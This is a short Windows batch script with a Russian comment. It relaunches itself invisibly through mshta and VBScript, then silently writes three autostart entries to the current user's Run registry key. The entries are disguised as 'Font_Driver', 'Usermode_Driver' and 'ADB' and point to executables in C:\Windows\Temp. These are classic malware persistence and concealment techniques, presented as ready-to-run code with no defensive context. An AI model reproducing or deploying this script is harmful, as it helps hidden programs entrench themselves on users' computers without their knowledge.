@echo off
if "%1"=="hidden" goto main

REM Запускаем себя скрыто
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""%~f0 hidden"", 0:close")
exit

:main
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Font_Driver" /t REG_SZ /d "C:\Windows\Temp\Font_Driver.exe" /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Usermode_Driver" /t REG_SZ /d "C:\Windows\Temp\Usermode_Driver.exe" /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "ADB" /t REG_SZ /d "C:\Windows\Temp\adb.exe" /f >nul 2>&1